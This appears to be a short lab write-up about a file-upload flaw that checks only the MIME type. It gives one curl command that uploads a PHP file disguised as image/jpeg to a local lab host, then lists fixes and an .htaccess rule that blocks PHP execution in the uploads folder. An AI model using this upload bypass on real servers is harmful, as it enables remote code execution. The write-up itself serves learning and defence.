🚨 **EXPLOIT**

The file upload feature accepts files based on their MIME type alone (e.g., image/jpeg).
`curl -X POST -F "uploaded=@php.php;type=image/jpeg" -F "Upload=Upload" 'http://192.168.38.130/?page=upload'`

---

✅ **PATCH**

1. Validate the File Extension in the backend
2. Check the MIME Type AND Content (Optional)
3. Change the file name (Optional)
4. Use .htaccess to Block Dangerous Execution

```
    # /uploads/.htaccess
    <FilesMatch "\.(php)$">
        Deny from all
    </FilesMatch>
```
